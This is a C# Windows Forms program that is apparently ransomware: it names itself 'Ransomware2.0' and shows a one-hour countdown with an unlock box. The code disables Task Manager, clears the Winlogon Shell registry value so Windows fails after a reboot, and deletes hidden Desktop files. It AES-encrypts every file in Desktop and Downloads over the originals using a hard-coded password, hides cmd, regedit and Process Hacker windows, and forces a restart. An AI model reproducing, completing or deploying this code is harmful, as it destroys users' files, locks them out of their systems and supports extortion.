﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Smile
{
    public partial class Smile : Form
    {
        //For hide window
        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;
        [DllImport("User32")]
        private static extern int ShowWindow(int hwnd, int nCmdShow);

        public Smile()
        {
            InitializeComponent();
            label4.Text = TimeSpan.FromMinutes(60).ToString();
        }

        private void Smile_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void Smile_Load(object sender, EventArgs e)
        {
            this.Opacity = 0.0;
            this.Size = new Size(50, 50);
            Location = new Point(-100, -100);
            FreezeMouse();

            //Disable taskmanager
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
            //Remove wallpaper
            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
            reg2.SetValue("Wallpaper", "", RegistryValueKind.String);
            //If you shutdown your computer, you cant run windows well
            RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg3.SetValue("Shell", "", RegistryValueKind.String);

            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            string[] filesPaths = Directory.EnumerateFiles(path + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            foreach (string file2 in filesPaths)
                File.Delete(file2);

            var startTime = DateTime.Now;

            var timer = new Timer() { Interval = 1000 };

            timer.Tick += (obj, args) =>
            label4.Text =
            (TimeSpan.FromMinutes(60) - (DateTime.Now - startTime))
            .ToString("hh\\:mm\\:ss");

            timer.Enabled = true;
            tmr_hide.Start();
            tmr_show.Start();
            tmr_if.Start();
            tmr_encrypt.Start();
            tmr_clock.Start();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        public static void FreezeMouse()
        {
            BlockImput(true);
        }

        public static void Thawouse()
        {
            BlockImput(false);
        }

        private static void BlockImput(bool v)
        {
            throw new NotImplementedException();
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            tmr_hide.Stop();
            this.Opacity = 100.0;
            this.Size = new Size(701, 584);
            Location = new Point(500, 500);
            Thawouse();
        }

        private void tmr_show_Tick(object sender, EventArgs e)
        {
            tmr_show.Stop();
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string filepath = (path + @"\desktop.ini");
            File.Delete(filepath);

            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            string filedl = (downloadFolder + @"\desktop.ini");
            File.Delete(filedl);
        }

        private void tmr_if_Tick(object sender, EventArgs e)
        {
            tmr_if.Stop();
            int hWnd;
            Process[] processRunning = Process.GetProcesses();
            foreach (Process pr in processRunning)
            {
                if(pr.ProcessName == "cmd")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }
                if(pr.ProcessName =="regedit")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }
                if(pr.ProcessName =="Processhacker")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }
                if(pr.ProcessName == "sdclt")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }
            }
            tmr_if.Start();
        }

        private void ShowWindow(int hWnd, object sW_HIDE)
        {
            throw new NotImplementedException();
        }

        private void tmr_encrypt_Tick(object sender, EventArgs e)
        {
            tmr_encrypt.Stop();
            Start_Encrypt();
        }

        private void tmr_clock_Tick(object sender, EventArgs e)
        {
            tmr_clock.Stop();
            Process[] _process = null;
            _process = Process.GetProcessesByName("Ransomware2.0");
            foreach(Process proces in _process)
            {
                Process.Start("shutdown", "/r /t 0");
                proces.Kill();
            }
            this.Close();
        }
        public class CoreEncryption
        {
            public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
            {
                byte[] encryptedBytes = null;

                // Set your salt here, change it to meet your flavor:
                // The salt bytes must be at least 8 bytes.
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                            cs.Close();
                        }
                        encryptedBytes = ms.ToArray();
                    }
                }

                return encryptedBytes;
            }
        }

        public class CoreDecryption
        {
            public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
            {
                byte[] decryptedBytes = null;

                // Set your salt here, change it to meet your flavor:
                // The salt bytes must be at least 8 bytes.
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                }

                return decryptedBytes;
            }
        }

        public class EncryptionFile
        {
            public void EncryptFile(string file, string password)
            {

                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                // Hash the password with SHA256
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesEncrypted = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);

                string fileEncrypted = file;

                File.WriteAllBytes(fileEncrypted, bytesEncrypted);
            }
        }

        static void Start_Encrypt() //We see start encrypt files on desktop and download folder
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);
            string[] files2 = Directory.GetFiles(downloadFolder + @"\", "*", SearchOption.AllDirectories);



            EncryptionFile enc = new EncryptionFile();


            string password = "password123"; //your password

            for (int i = 0; i < files.Length; i++)
            {
                enc.EncryptFile(files[i], password);

            }

            for (int i = 0; i < files2.Length; i++)
            {
                enc.EncryptFile(files2[i], password);

            }
        }

        static void OFF_Encrypt() //time to descrypt
        {

            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);
            string[] files2 = Directory.GetFiles(downloadFolder + @"\", "*", SearchOption.AllDirectories);


            DecryptionFile dec = new DecryptionFile();

            string password = "password123";

            for (int i = 0; i < files.Length; i++)
            {
                dec.DecryptFile(files[i], password);
            }

            for (int i = 0; i < files2.Length; i++)
            {
                dec.DecryptFile(files2[i], password);

            }
        }

        public class DecryptionFile
        {
            public void DecryptFile(string fileEncrypted, string password)
            {

                byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesDecrypted = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, passwordBytes);

                string file = fileEncrypted;
                File.WriteAllBytes(file, bytesDecrypted);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (codebox.Text == "") //If you dont write
            {
                MessageBox.Show("Incorrect key", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            else if (codebox.Text == "password123") //If you write correct key
            {

                MessageBox.Show("The key is correct", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Information);
                //Enable taskmanager
                RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                reg.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
                //Repair shell
                RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                reg3.SetValue("Shell", "explorer.exe", RegistryValueKind.String);

                OFF_Encrypt(); //decrypt all encrypt files

                //kill ransomware
                Process[] _process = null;
                _process = Process.GetProcessesByName("Rasomware2.0");
                foreach (Process proces in _process)
                {
                    proces.Kill();
                }
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}

